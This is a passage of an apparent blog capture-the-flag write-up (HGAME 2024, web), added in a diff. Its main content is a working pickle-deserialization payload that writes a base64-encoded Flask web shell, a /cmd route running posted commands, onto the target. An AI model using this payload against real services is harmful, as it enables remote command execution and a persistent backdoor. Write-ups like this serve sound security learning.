class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将以上脚本 base64 编码，并生成写入文件的 payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myflaskrce</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 这里返回一个元组，包含eval函数和一个经过base64编码的命令字符串</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;echo aW1wb3J0IG9zCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrLCBzZXNzaW9uLCByZXF1ZXN0LCBzZW5kX2ZpbGUKCmFwcCA9IEZsYXNrKF9fbmFtZV9fKQoKQGFwcC5yb3V0ZSgnL2NtZCcsIG1ldGhvZHM9WydQT1NUJ10pCmRlZiBteWNtZCgpOgogICAgaGFuZGxlID0gb3MucG9wZW4ocmVxdWVzdC5mb3JtLmdldCgnY21kJykpICAKICAgIHJldCA9IGhhbmRsZS5yZWFkKCkgIAogICAgaGFuZGxlLmNsb3NlKCkKICAgIHJldHVybiByZXQKCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOgogICAgYXBwLnJ1bihkZWJ1Zz1UcnVlLCBob3N0PSIwLjAuMC4wIikK |base64 -d &gt; app.py&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个myflaskrce类的实例</span></span><br><span class="line">malicious_object = myflaskrce()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pickle模块将对象序列化为字节串，并使用base64进行编码</span></span><br><span class="line">payload = base64.b64encode(pickle.dumps(malicious_object))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个字典，用于存储表单数据</span></span><br><span class="line">post_params = &#123;<span class="string">&#x27;pickle_data&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用urlencode函数对表单数据进行URL编码</span></span><br><span class="line">encoded_params = urlencode(post_params)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印编码后的表单数据</span></span><br><span class="line"><span class="built_in">print</span>(encoded_params)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011429027.png" alt="image-20240218011429027"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011344391.png" alt="image-20240218011344391"></p>
+<p>不知道是不是hackbar 还是环境坏了的问题  重启一下环境 使用bp 然后写进&#x2F;cmd   也成功RCE</p>
+<hr>
+<blockquote>
+<p>search4member与梅开二度</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个是有关java的堆叠注入 一个是有关go的ssti xss</span><br><span class="line">(暂未吃透)</span><br></pre></td></tr></table></figure>
+
+<p>推荐官方wp进行学习以及<a target="_blank" rel="noopener" href="https://www.itbaoku.cn/post/3261173.html">HGAME 2024 WEEK2 Web方向题解全 </a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">Web(部分)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-the-cow-say"><span class="toc-number">1.1.</span> <span class="toc-text">What the cow say?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-More-Courses"><span class="toc-number">1.2.</span> <span class="toc-text">Select More Courses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#myflask"><span class="toc-number">1.3.</span> <span class="toc-text">myflask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-session-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.3.1.</span> <span class="toc-text">flask session 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">pickle 反序列化 RCE</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&text=HGAME 2024 WEEK 2 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&is_video=false&description=HGAME 2024 WEEK 2 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2024 WEEK 2 wp&body=Check out this article: https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&name=HGAME 2024 WEEK 2 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&t=HGAME 2024 WEEK 2 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
